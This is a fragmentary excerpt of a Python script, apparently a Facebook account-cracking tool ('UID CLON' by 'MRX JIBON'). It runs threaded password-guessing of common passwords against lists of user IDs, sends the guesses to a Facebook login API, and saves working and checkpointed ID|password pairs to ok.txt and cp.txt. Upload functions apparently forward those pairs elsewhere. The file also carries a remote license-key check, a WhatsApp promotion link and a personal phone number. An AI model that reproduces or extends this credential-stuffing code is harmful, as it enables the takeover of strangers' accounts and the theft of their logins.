...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> MRX JIBON HACKER")
	subprocess.check_output(["am", "start", "https://chat.whatsapp.com/IruRGeLlCOx8dJCfd81R5q"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/MRXJIBON/MRX-JIBON10/blob/main/MRX-JIBON10.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            MD JIBON ISLAM 
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Md Jibon Islam 
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01865544636
     \033[1;96m➣ \033[1;92mGITHUB     :            MRXJIBON
     \033[1;95m➣ \033[1;92mTOOLS      :            UID CLON
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    """)
		print("%s [%sâ€¢%s] %sTOOL NAME : %sUID CLON"%(G,R,G,Y,G))
		print("%s [%sâ€¢%s] %sVERSION   : %s1.10"%(G,R,G,Y,G))
...
#				exit()
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR MRX JIBON  "%(Y,G,B,Y))
	...
	def old_9(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR MRX JIBON "%(Y,W,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR JIBON  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:JIBON ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [JIBON] : \033[0;97m %s/%s -> \033[0;92m [JIBON -OK:%s ]- \033[0;93m[JIBON-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[JIBON-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [JIBON-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[JIBON-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [JIBON-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
